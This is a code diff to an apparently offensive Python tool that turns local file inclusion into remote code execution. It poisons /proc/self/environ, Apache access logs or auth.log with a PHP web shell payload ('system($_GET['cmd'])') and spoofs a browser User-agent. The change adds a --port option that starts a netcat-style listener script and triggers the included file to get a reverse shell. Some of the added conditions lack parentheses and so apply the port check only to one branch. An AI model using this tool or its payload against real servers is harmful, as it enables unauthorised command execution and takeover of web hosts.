@@ -17,7 +17,7 @@ class Shell_conncet:
      def __init__(self):
         self.control()
         if "proc/self/environ" in self.url\
-        or 'apache2/access.log' in self.url:                                                                                                          
+        or 'apache2/access.log' in self.url and not self.args.port:                                                                                                          
             self.paylaodPHP = "<?php system($_GET['cmd']); ?>"           
             request = mechanize.Browser()
             request.set_handle_robots(False)
@@ -50,7 +50,7 @@ class Shell_conncet:
                          exit()
                 except KeyboardInterrupt:
                      exit()
-        elif  "auth" in  self.url or "auth.log" in  self.url :                  
+        elif  "auth" in  self.url or "auth.log" in  self.url and not self.args.port:                  
                 if os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','r') as readHost:
                                       Host = readHost.read()
@@ -147,7 +147,21 @@ class Shell_conncet:
                          print("[*] Example : http://10.10.10.193:4000/page=index.php")
                          exit()
                 except KeyboardInterrupt:
-                     exit()      
+                     exit()
+        elif self.args.port:
+              path   =  "python " +str(os.getcwd())+'/Package/shell/Listen.py'
+              run    = ' gnome-terminal  -e '+'" '+path+' "'
+              xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
+              request = mechanize.Browser()
+              request.set_handle_robots(False)
+              request.set_handle_redirect(True)
+              request.set_handle_refresh(True, max_time=1)  
+              request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                    ('Cookie',str(self.Cookie).replace('\n','')),]
+              request.open(self.LFI).read()    
+              #self.Get_Oregnal_URL = request.open(command).read()
+              exit()
      def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
            parser.add_argument("-UV","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
@@ -162,6 +176,7 @@ class Shell_conncet:
            parser.add_argument("-LU","--loginurl"   , action=None                            ,help =" add login url for auth motted") 
            parser.add_argument("-U","--user"        , action=None                            ,help ="use specific username ")
            parser.add_argument("-A" ,"--aggress"       ,action='store_true'                     ,help ="  use aggressiv mode  ")
+           parser.add_argument("--port"             ,action=None                             ,help ="  set port for netcat ")
            parser.add_argument( "-S", "--shell"       , action=None                            ,help ="  to connent reverseshell   ")
            self.args = parser.parse_args()    
            if len(sys.argv)!=1 :
